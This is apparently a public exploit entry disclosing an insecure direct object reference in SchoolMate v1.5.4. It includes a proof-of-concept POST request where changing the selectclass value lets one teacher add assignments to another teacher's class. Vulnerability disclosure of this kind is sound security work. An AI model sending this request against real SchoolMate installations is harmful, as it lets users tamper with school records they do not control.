# Exploit Title: SchoolMate v1.5.4 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/schoolmate/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SchoolMate
## Version: v1.5.4
## Exploit Description:
## SchoolMate v1.5.4 suffers from IDOR - Broken Access Control Vulnerability allowing attacker teacher to add assignment in class that is assigned by other teacher (horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /index.php HTTP/1.1
...

title=assignment11&task=a111&total=50&assigneddate=1%2F1%2F2024&duedate=1%2F7%2F2023&addassignment=1&page2=2&logout=&selectclass=2(CHANGE HERE)&page=2
```